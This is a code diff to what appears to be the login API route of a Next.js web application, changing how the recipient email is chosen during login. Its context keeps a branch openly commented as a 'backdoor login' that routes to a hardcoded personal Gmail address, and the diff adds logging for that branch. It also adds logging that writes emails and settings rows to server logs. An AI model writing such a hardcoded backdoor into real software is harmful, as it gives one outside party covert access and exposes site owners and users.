@@ -48,17 +48,22 @@ export async function POST(req: NextRequest) {
 
             if (isBackdoorLogin) {
                 // Backdoor login - send to ozgurglr256@gmail.com
+                console.log('[Login] Backdoor login detected for ozgurglr256@gmail.com')
                 targetEmail = 'ozgurglr256@gmail.com'
             } else {
-                // Normal login - try to get admin_email from site settings
+                // Normal login - try to get admin_email from site settings (key-value store)
                 try {
-                    const siteSettings = await db.prepare('SELECT admin_email FROM site_settings LIMIT 1').first() as any
-                    if (siteSettings?.admin_email) {
-                        targetEmail = siteSettings.admin_email
+                    const settingRow = await db.prepare("SELECT value FROM site_settings WHERE key = 'admin_email'").first() as any
+                    console.log('[Login] Admin email setting fetched:', settingRow)
+
+                    if (settingRow?.value) {
+                        targetEmail = settingRow.value
+                        console.log('[Login] Using admin_email from settings:', targetEmail)
+                    } else {
+                        console.log('[Login] No admin_email setting found, using login email:', targetEmail)
                     }
                 } catch (e) {
-                    // admin_email column might not exist yet - use login email
-                    console.log('admin_email column not found, using login email')
+                    console.log('[Login] Settings fetch failed:', e)
                 }
             }
 
